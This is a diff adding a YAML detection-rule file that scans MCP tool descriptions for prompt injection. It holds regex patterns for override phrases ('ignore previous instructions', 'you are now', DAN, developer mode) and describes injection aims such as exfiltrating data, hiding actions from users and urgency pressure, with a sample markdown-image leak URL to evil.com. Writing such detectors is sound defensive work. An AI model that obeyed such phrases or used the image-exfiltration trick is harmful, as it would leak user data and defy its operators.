@@ -1,0 +1,148 @@
+# Prompt injection patterns — instructions that try to subvert the LLM.
+# References:
+#   - https://owasp.org/www-project-mcp-top-10/ (MCP01: Prompt Injection via Tool Description)
+#   - https://labs.cloudsecurityalliance.org/research/csa-research-note-mcp-tool-poisoning-auto-execution-20260701/
+version: 1
+patterns:
+  - id: pi-ignore-previous
+    name: "Ignore previous instructions"
+    description: |
+      Classic prompt injection opener. Tries to discard the system prompt
+      before issuing new instructions.
+    category: prompt-injection
+    severity: critical
+    fields: [description]
+    matchers:
+      - kind: regex
+        pattern: "ignore\\s+(all\\s+)?(previous|prior|above|earlier)\\s+(instructions|prompts|rules)"
+        flags: "i"
+      - kind: regex
+        pattern: "disregard\\s+(all\\s+)?(previous|prior|above)"
+        flags: "i"
+      - kind: regex
+        pattern: "forget\\s+(everything|all)\\s+(you|above)"
+        flags: "i"
+    references:
+      - https://owasp.org/www-project-mcp-top-10/
+      - https://cwe.mitre.org/data/definitions/1427.html
+
+  - id: pi-new-system-prompt
+    name: New system prompt injection
+    description: |
+      Attempts to redefine the system prompt from inside a tool description.
+    category: prompt-injection
+    severity: critical
+    fields: [description]
+    matchers:
+      - kind: regex
+        pattern: "system\\s*:\\s*you\\s+are"
+        flags: "i"
+      - kind: regex
+        pattern: "new\\s+instructions?\\s*:"
+        flags: "i"
+      - kind: regex
+        pattern: "^\\s*\\[INST\\]|<<SYS>>"
+    references:
+      - https://owasp.org/www-project-mcp-top-10/
+
+  - id: pi-jailbreak
+    name: Jailbreak persona
+    description: |
+      Tool description attempts to invoke a known jailbreak persona (DAN,
+      developer mode, etc.) to bypass safety training.
+    category: prompt-injection
+    severity: critical
+    fields: [description]
+    matchers:
+      - kind: regex
+        pattern: "\\bDAN\\b|do anything now"
+        flags: "i"
+      - kind: regex
+        pattern: "developer\\s+mode\\s+(enabled|on|activated)"
+        flags: "i"
+      - kind: regex
+        pattern: "jailbreak\\s+(mode|prompt)"
+        flags: "i"
+    references:
+      - https://owasp.org/www-project-mcp-top-10/
+
+  - id: pi-exfil-via-llm
+    name: Exfiltrate via LLM
+    description: |
+      Description instructs the LLM to relay data to an external destination
+      — the most direct prompt-injection-as-exfiltration primitive.
+    category: prompt-injection
+    severity: critical
+    fields: [description]
+    matchers:
+      - kind: regex
+        pattern: "(send|email|post|transmit|upload)[^.]{0,80}(contents?|data|file|secret|key|token|password)[^.]{0,80}(to|at|via)\\s+https?://"
+        flags: "i"
+    references:
+      - https://labs.cloudsecurityalliance.org/research/csa-research-note-mcp-tool-poisoning-auto-execution-20260701/
+
+  - id: pi-hide-from-user
+    name: Hide output from user
+    description: |
+      Description instructs the LLM to conceal its actions or outputs from
+      the user — a strong signal of malicious intent.
+    category: prompt-injection
+    severity: critical
+    fields: [description]
+    matchers:
+      - kind: regex
+        pattern: "do\\s+not\\s+(show|display|mention|reveal|tell)[^.]{0,60}(user|human|developer)"
+        flags: "i"
+      - kind: regex
+        pattern: "(hide|conceal|withhold)[^.]{0,60}(output|response|action|behavior)"
+        flags: "i"
+    references:
+      - https://owasp.org/www-project-mcp-top-10/
+
+  - id: pi-impersonate
+    name: Persona impersonation
+    description: |
+      Description asks the LLM to impersonate a different role or entity.
+    category: prompt-injection
+    severity: high
+    fields: [description]
+    matchers:
+      - kind: regex
+        pattern: "pretend\\s+to\\s+be|you\\s+are\\s+now\\s+(a|an)\\s+"
+        flags: "i"
+      - kind: regex
+        pattern: "act\\s+as\\s+(a|an|if\\s+you\\s+were)\\s+"
+        flags: "i"
+    references:
+      - https://owasp.org/www-project-mcp-top-10/
+
+  - id: pi-markdown-image-exfil
+    name: Markdown image exfiltration
+    description: |
+      Description contains a markdown image with a URL template that would
+      leak data (e.g. `![](https://evil.com/?d={data})`). A documented
+      prompt injection vector.
+    category: prompt-injection
+    severity: high
+    fields: [description]
+    matchers:
+      - kind: regex
+        pattern: "!\\[[^\\]]*\\]\\(\\s*https?://[^)\\s]+\\{[^}]+\\}"
+    references:
+      - https://owasp.org/www-project-mcp-top-10/
+
+  - id: pi-urgency
+    name: Urgency framing
+    description: |
+      Description uses urgency framing to pressure the LLM into acting
+      without deliberation. Lower severity — only meaningful in context
+      with other findings.
+    category: prompt-injection
+    severity: low
+    fields: [description]
+    matchers:
+      - kind: regex
+        pattern: "\\b(urgent|critical|emergency|immediately|right now|asap)\\b[^.]{0,30}(must|need to|have to|required to)"
+        flags: "i"
+    references:
+      - https://owasp.org/www-project-mcp-top-10/
